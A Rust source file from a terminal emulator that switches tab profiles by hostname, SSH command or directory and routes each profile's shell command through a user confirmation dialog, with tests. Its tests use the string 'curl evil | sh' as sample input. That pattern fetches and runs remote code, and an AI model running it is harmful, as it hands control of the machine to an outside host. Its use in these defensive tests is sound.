//! Automatic profile switching logic for WindowState.
//!
//! Contains hostname-based, SSH-command-based, and directory-based automatic
//! profile switching triggered by OSC 7 / shell-integration events.
//!
//! ## Security
//!
//! A profile may carry a `command` that is written straight into the running
//! shell. The trigger for that write is an OSC 7 sequence, which is emitted by
//! whatever is producing terminal output — including a remote host over SSH —
//! and a `*` hostname pattern matches everything. Profile commands are
//! therefore never executed inline. They go through the same confirmation queue
//! the trigger subsystem uses for `RunCommand` / `SendText`
//! (`TriggerState::pending_trigger_actions`), so the user sees the exact command
//! before it runs. Two rules sit on top of that queue:
//!
//! 1. `ssh.ssh_auto_profile_switch` gates hostname-driven switching entirely.
//! 2. A profile fetched from a dynamic (remote) source re-confirms every time,
//!    even if the user previously chose "Always Allow" for it.

use par_term_config::ProfileId;
use par_term_emu_core_rust::terminal::ActionResult;

use super::super::window_state::WindowState;

/// Marker bit set on every synthetic profile-command confirmation id.
///
/// The core `TriggerRegistry` hands out real trigger ids sequentially starting
/// at 1, so tagging the high bit keeps profile ids out of that space and stops
/// an "Always Allow" grant from leaking across the two systems.
const PROFILE_COMMAND_ID_TAG: u64 = 1 << 63;

/// Synthetic confirmation id for a profile command.
///
/// Derived from the command text as well as the profile id, so an
/// "Always Allow" grant does not transfer to a different command when the
/// profile is edited or re-fetched.
fn profile_command_action_id(profile_id: &ProfileId, command_line: &str) -> u64 {
    use std::hash::{Hash, Hasher};

    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    profile_id.hash(&mut hasher);
    command_line.hash(&mut hasher);
    hasher.finish() | PROFILE_COMMAND_ID_TAG
}

/// Build the shell line for a profile's `command` plus `command_args`.
///
/// Returns `None` when the profile has no command or the command is blank.
fn profile_command_line(command: Option<&str>, args: Option<&[String]>) -> Option<String> {
    let command = command?.trim();
    if command.is_empty() {
        return None;
    }

    let mut line = command.to_string();
    for arg in args.unwrap_or_default() {
        line.push(' ');
        line.push_str(arg);
    }
    line.push('\n');
    Some(line)
}

/// Whether a profile command may skip the confirmation dialog.
///
/// `session_approved` is the user's earlier "Always Allow" for this exact
/// command. It is honoured only for local profiles: the user consented to a
/// profile *source*, not to arbitrary commands from it, and that source can
/// change the command on any refresh.
fn profile_command_pre_approved(remote_origin: bool, session_approved: bool) -> bool {
    !remote_origin && session_approved
}

impl WindowState {
    /// Check for automatic profile switching based on hostname, SSH command, and directory detection
    ///
    /// This checks the active tab for hostname and CWD changes (detected via OSC 7),
    /// SSH command detection, and applies matching profiles automatically.
    /// Priority: explicit user selection > hostname match > SSH command match > directory match > default
    ///
    /// Returns true if a profile was auto-applied, triggering a redraw.
    pub fn check_auto_profile_switch(&mut self) -> bool {
        if self.overlay_ui.profile_manager.is_empty() {
            return false;
        }

        let mut changed = false;

        // --- Hostname-based switching (highest priority) ---
        changed |= self.check_auto_hostname_switch();

        // --- SSH command-based switching (medium priority, only if no hostname profile active) ---
        if !changed {
            changed |= self.check_ssh_command_switch();
        }

        // --- Directory-based switching (lower priority, only if no hostname profile) ---
        changed |= self.check_auto_directory_switch();

        changed
    }

    /// Check for hostname-based automatic profile switching
    pub(super) fn check_auto_hostname_switch(&mut self) -> bool {
        let tab = match self.tab_manager.active_tab_mut() {
            Some(t) => t,
            None => return false,
        };

        let new_hostname = match tab.check_hostname_change() {
            Some(h) => h,
            None => {
                if tab.detected_hostname.is_none() && tab.profile.auto_applied_profile_id.is_some()
                {
                    crate::debug_info!(
                        "PROFILE",
                        "Clearing auto-applied hostname profile (returned to localhost)"
                    );
                    tab.profile.auto_applied_profile_id = None;
                    tab.profile.profile_icon = None;
                    tab.profile.badge_override = None;
                    // Restore original tab title
                    if let Some(original) = tab.profile.pre_profile_title.take() {
                        tab.set_title(&original);
                    }

                    // Revert SSH auto-switch if active
                    if tab.profile.ssh_auto_switched {
                        crate::debug_info!(
                            "PROFILE",
                            "Reverting SSH auto-switch (disconnected from remote host)"
                        );
                        tab.profile.ssh_auto_switched = false;
                        tab.profile.pre_ssh_switch_profile = None;
                    }
                }
                return false;
            }
        };

        // SEC-002: honour the `ssh.ssh_auto_profile_switch` toggle. The hostname
        // arrives via OSC 7, i.e. from whatever writes to the terminal, so the
        // user must be able to switch this path off. The revert branch above
        // still runs, so a tab that switched before the toggle was cleared can
        // still return to its original title.
        if !self.config.load().ssh.ssh_auto_profile_switch {
            crate::debug_log!(
                "PROFILE",
                "Hostname auto-switch disabled by config (ssh_auto_profile_switch=false)"
            );
            return false;
        }

        // Don't re-apply the same profile
        if let Some(existing_profile_id) = tab.profile.auto_applied_profile_id
            && let Some(profile) = self
                .overlay_ui
                .profile_manager
                .find_by_hostname(&new_hostname)
            && profile.id == existing_profile_id
        {
            return false;
        }

        if let Some(profile) = self
            .overlay_ui
            .profile_manager
            .find_by_hostname(&new_hostname)
        {
            let profile_name = profile.name.clone();
            let profile_id = profile.id;
            let profile_tab_name = profile.tab_name.clone();
            let profile_icon = profile.icon.clone();
            let profile_badge_text = profile.badge_text.clone();
            let profile_command = profile.command.clone();
            let profile_command_args = profile.command_args.clone();
            let profile_is_remote = profile.source.is_dynamic();

            crate::debug_info!(
                "PROFILE",
                "Auto-switching to profile '{}' for hostname '{}'",
                profile_name,
                new_hostname
            );

            // Apply profile visual settings to the tab
            if let Some(tab) = self.tab_manager.active_tab_mut() {
                // Track SSH auto-switch state for revert on disconnect
                if !tab.profile.ssh_auto_switched {
                    tab.profile.pre_ssh_switch_profile = tab.profile.auto_applied_profile_id;
                    tab.profile.ssh_auto_switched = true;
                }

                tab.profile.auto_applied_profile_id = Some(profile_id);
                tab.profile.profile_icon = profile_icon;

                // Save original title before overriding (only if not already saved)
                if tab.profile.pre_profile_title.is_none() {
                    tab.profile.pre_profile_title = Some(tab.title.clone());
                }
                // Apply profile tab name (fall back to profile name)
                tab.set_title(&profile_tab_name.unwrap_or_else(|| profile_name.clone()));

                // Apply badge text override if configured
                if let Some(badge_text) = profile_badge_text {
                    tab.profile.badge_override = Some(badge_text);
                }
            }

            // Queue the profile command for confirmation (never executed inline).
            self.dispatch_profile_command(
                profile_id,
                &profile_name,
                profile_command.as_deref(),
                profile_command_args.as_deref(),
                profile_is_remote,
                &format!("hostname '{}'", new_hostname),
            );

            // Apply profile badge settings (color, font, margins, etc.)
            self.apply_profile_badge(
                &self
                    .overlay_ui
                    .profile_manager
                    .get(&profile_id)
                    .expect("profile_id obtained from profile_manager.find_by_name above")
                    .clone(),
            );

            log::info!(
                "Auto-applied profile '{}' for hostname '{}'",
                profile_name,
                new_hostname
            );
            true
        } else {
            crate::debug_info!(
                "PROFILE",
                "No profile matches hostname '{}' - consider creating one",
                new_hostname
            );
            false
        }
    }

    /// Check for SSH command-based automatic profile switching
    ///
    /// When the running command is "ssh", parse the target host from the command
    /// and try to match a profile by hostname pattern. When SSH disconnects
    /// (command changes from "ssh" to something else), revert to the previous profile.
    pub(super) fn check_ssh_command_switch(&mut self) -> bool {
        // Extract command info and current SSH state from the active tab
        let (current_command, already_switched, has_hostname_profile) = {
            let tab = match self.tab_manager.active_tab() {
                Some(t) => t,
                None => return false,
            };

            // try_lock: intentional — SSH command check in about_to_wait (sync event loop).
            // On miss: returns None (no command seen), skipping SSH profile switch this frame.
            // Will be evaluated again next frame.
            let cmd = if let Ok(term) = tab.terminal.try_read() {
                term.get_running_command_name()
            } else {
                None
            };

            (
                cmd,
                tab.profile.ssh_auto_switched,
                tab.profile.auto_applied_profile_id.is_some(),
            )
        };

        let is_ssh = current_command
            .as_ref()
            .is_some_and(|cmd| cmd == "ssh" || cmd.ends_with("/ssh"));

        if is_ssh && !already_switched && !has_hostname_profile {
            // SSH just started - try to extract the target host from the command
            // Shell integration may report just "ssh" as the command name;
            // the actual hostname will come via OSC 7 hostname detection.
            // For now, mark that SSH is active so we can revert when it ends.
            if let Some(tab) = self.tab_manager.active_tab_mut() {
                crate::debug_info!(
                    "PROFILE",
                    "SSH command detected - waiting for hostname via OSC 7"
                );
                // Mark SSH as active for revert tracking (the actual profile
                // switch will happen via check_auto_hostname_switch when OSC 7 arrives)
                tab.profile.ssh_auto_switched = true;
            }
            false
        } else if !is_ssh && already_switched && !has_hostname_profile {
            // SSH disconnected and no hostname-based profile is active - revert
            if let Some(tab) = self.tab_manager.active_tab_mut() {
                crate::debug_info!("PROFILE", "SSH command ended - reverting auto-switch state");
                tab.profile.ssh_auto_switched = false;
                let _prev_profile = tab.profile.pre_ssh_switch_profile.take();
                // Clear any SSH-related visual overrides
                tab.profile.profile_icon = None;
                tab.profile.badge_override = None;
                if let Some(original) = tab.profile.pre_profile_title.take() {
                    tab.set_title(&original);
                }
            }
            true // Trigger redraw to reflect reverted state
        } else {
            false
        }
    }

    /// Check for directory-based automatic profile switching
    pub(super) fn check_auto_directory_switch(&mut self) -> bool {
        let tab = match self.tab_manager.active_tab_mut() {
            Some(t) => t,
            None => return false,
        };

        // Don't override hostname-based profile (higher priority)
        if tab.profile.auto_applied_profile_id.is_some() {
            return false;
        }

        let new_cwd = match tab.check_cwd_change() {
            Some(c) => c,
            None => return false,
        };

        // Don't re-apply the same profile
        if let Some(existing_profile_id) = tab.profile.auto_applied_dir_profile_id
            && let Some(profile) = self.overlay_ui.profile_manager.find_by_directory(&new_cwd)
            && profile.id == existing_profile_id
        {
            return false;
        }

        if let Some(profile) = self.overlay_ui.profile_manager.find_by_directory(&new_cwd) {
            let profile_name = profile.name.clone();
            let profile_id = profile.id;
            let profile_tab_name = profile.tab_name.clone();
            let profile_icon = profile.icon.clone();
            let profile_badge_text = profile.badge_text.clone();
            let profile_command = profile.command.clone();
            let profile_command_args = profile.command_args.clone();
            let profile_is_remote = profile.source.is_dynamic();

            crate::debug_info!(
                "PROFILE",
                "Auto-switching to profile '{}' for directory '{}'",
                profile_name,
                new_cwd
            );

            // Apply profile visual settings to the tab
            if let Some(tab) = self.tab_manager.active_tab_mut() {
                tab.profile.auto_applied_dir_profile_id = Some(profile_id);
                tab.profile.profile_icon = profile_icon;

                // Save original title before overriding (only if not already saved)
                if tab.profile.pre_profile_title.is_none() {
                    tab.profile.pre_profile_title = Some(tab.title.clone());
                }
                // Apply profile tab name (fall back to profile name)
                tab.set_title(&profile_tab_name.unwrap_or_else(|| profile_name.clone()));

                // Apply badge text override if configured
                if let Some(badge_text) = profile_badge_text {
                    tab.profile.badge_override = Some(badge_text);
                }
            }

            // Queue the profile command for confirmation (never executed inline).
            self.dispatch_profile_command(
                profile_id,
                &profile_name,
                profile_command.as_deref(),
                profile_command_args.as_deref(),
                profile_is_remote,
                &format!("directory '{}'", new_cwd),
            );

            // Apply profile badge settings (color, font, margins, etc.)
            self.apply_profile_badge(
                &self
                    .overlay_ui
                    .profile_manager
                    .get(&profile_id)
                    .expect("profile_id obtained from profile_manager.find_by_name above")
                    .clone(),
            );

            log::info!(
                "Auto-applied profile '{}' for directory '{}'",
                profile_name,
                new_cwd
            );
            true
        } else {
            // Clear directory profile if CWD no longer matches any pattern
            if let Some(tab) = self.tab_manager.active_tab_mut()
                && tab.profile.auto_applied_dir_profile_id.is_some()
            {
                crate::debug_info!(
                    "PROFILE",
                    "Clearing auto-applied directory profile (CWD '{}' no longer matches)",
                    new_cwd
                );
                tab.profile.auto_applied_dir_profile_id = None;
                tab.profile.profile_icon = None;
                tab.profile.badge_override = None;
                // Restore original tab title
                if let Some(original) = tab.profile.pre_profile_title.take() {
                    tab.set_title(&original);
                }
            }
            false
        }
    }

    /// Queue a profile's `command` for execution behind the trigger
    /// confirmation dialog.
    ///
    /// Shared by the hostname and directory auto-switch paths. The command is
    /// never written to the shell from here: it is pushed onto
    /// `TriggerState::pending_trigger_actions` as a `SendText` action, and
    /// `check_trigger_actions` performs the single write once the user
    /// approves. That keeps one execution sink for every automated write into
    /// the shell, and it means auto-switch inherits the trigger subsystem's
    /// audit logging.
    pub(crate) fn dispatch_profile_command(
        &mut self,
        profile_id: ProfileId,
        profile_name: &str,
        command: Option<&str>,
        command_args: Option<&[String]>,
        remote_origin: bool,
        match_reason: &str,
    ) {
        let Some(command_line) = profile_command_line(command, command_args) else {
            return;
        };

        let action_id = profile_command_action_id(&profile_id, &command_line);
        let session_approved = self
            .trigger_state
            .always_allow_trigger_ids
            .contains(&action_id);

        let action = ActionResult::SendText {
            trigger_id: action_id,
            text: command_line.clone(),
            delay_ms: 0,
        };

        if profile_command_pre_approved(remote_origin, session_approved) {
            self.trigger_state.approved_pending_actions.push(action);
            return;
        }

        // A hostname that flaps would otherwise stack one dialog per transition.
        if self
            .trigger_state
            .pending_trigger_actions
            .iter()
            .any(|pending| pending.trigger_id == action_id)
        {
            return;
        }

        let displayed = command_line.trim_end();
        crate::debug_info!(
            "PROFILE",
            "AUDIT profile command queued for confirmation profile='{}' remote={} command={:?}",
            profile_name,
            remote_origin,
            displayed
        );

        let origin_note = if remote_origin {
            "\nThis profile was fetched from a remote profile source."
        } else {
            ""
        };
        // Without an entry here the dialog claims "A trigger matched terminal
        // output", which is false for this producer. Registered only on the path
        // that actually queues a dialog — the dialog removes the entry when the
        // action resolves, so an entry on a path that never queues would leak.
        self.trigger_state.automation_action_notes.insert(
            action_id,
            "Automatic profile switching queued this, not an output trigger. \
             Approving runs the command shown above in this shell."
                .to_string(),
        );
        self.trigger_state.pending_trigger_actions.push(
            crate::app::window_state::PendingTriggerAction {
                trigger_id: action_id,
                trigger_name: format!("Profile auto-switch: {}", profile_name),
                action,
                description: format!(
                    "Matched {}.{}\nRun in this shell: {}",
                    match_reason, origin_note, displayed
                ),
                // Auto-switch matches on the active tab's hostname or CWD, and
                // the dialog says "this shell" — the active tab is the target.
                target: None,
            },
        );
    }
}

#[cfg(test)]
mod tests {
    use super::{
        PROFILE_COMMAND_ID_TAG, profile_command_action_id, profile_command_line,
        profile_command_pre_approved,
    };

    fn id() -> par_term_config::ProfileId {
        uuid::Uuid::nil()
    }

    #[test]
    fn command_line_is_none_without_a_command() {
        assert_eq!(profile_command_line(None, None), None);
        assert_eq!(profile_command_line(Some("   "), None), None);
    }

    #[test]
    fn command_line_appends_args_and_newline() {
        assert_eq!(
            profile_command_line(
                Some("tmux"),
                Some(&["attach".to_string(), "-t".to_string()])
            ),
            Some("tmux attach -t\n".to_string())
        );
        assert_eq!(
            profile_command_line(Some("htop"), None),
            Some("htop\n".to_string())
        );
    }

    #[test]
    fn action_ids_never_collide_with_real_trigger_ids() {
        // The core TriggerRegistry allocates trigger ids sequentially from 1,
        // so the tag bit must always be set on a profile command id.
        for command in ["a\n", "curl evil | sh\n", ""] {
            let action_id = profile_command_action_id(&id(), command);
            assert_ne!(action_id & PROFILE_COMMAND_ID_TAG, 0);
            assert!(action_id > u64::from(u32::MAX));
        }
    }

    #[test]
    fn action_id_is_stable_and_command_bound() {
        let a = profile_command_action_id(&id(), "echo hi\n");
        assert_eq!(a, profile_command_action_id(&id(), "echo hi\n"));
        assert_ne!(a, profile_command_action_id(&id(), "curl evil | sh\n"));
        assert_ne!(
            a,
            profile_command_action_id(&uuid::Uuid::from_u128(1), "echo hi\n")
        );
    }

    #[test]
    fn remote_profile_command_always_requires_confirmation() {
        // Even with a prior "Always Allow" for this exact command, a profile
        // fetched from a dynamic source must re-confirm: the source can change
        // the command on any refresh.
        assert!(!profile_command_pre_approved(true, true));
        assert!(!profile_command_pre_approved(true, false));
    }

    #[test]
    fn local_profile_command_honours_an_earlier_always_allow() {
        assert!(profile_command_pre_approved(false, true));
        assert!(!profile_command_pre_approved(false, false));
    }
}
